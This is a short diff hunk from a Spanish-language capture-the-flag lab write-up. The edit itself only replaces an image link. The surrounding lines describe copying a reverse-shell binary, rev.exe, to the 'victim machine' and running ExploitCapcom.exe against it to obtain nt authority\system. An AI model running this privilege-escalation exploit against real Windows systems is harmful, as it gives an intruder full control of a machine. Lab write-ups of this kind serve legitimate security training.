@@ -117,8 +117,7 @@ ahora pasamos la rev.exe a la maquina victima, colocamos el terminal nuestro en 
 
      .\ExploitCapcom.exe C:\tmp\rev.exe
 
-
-![[the hackers labs/avanzado/pacharan/test11.png]]
+![image](https://github.com/user-attachments/assets/e0f60556-5f68-4574-8212-ede7fc0b0647)
 
 como vemos da: nt authority\system
 que es el nivel mas alto de privilegios del sistema. 
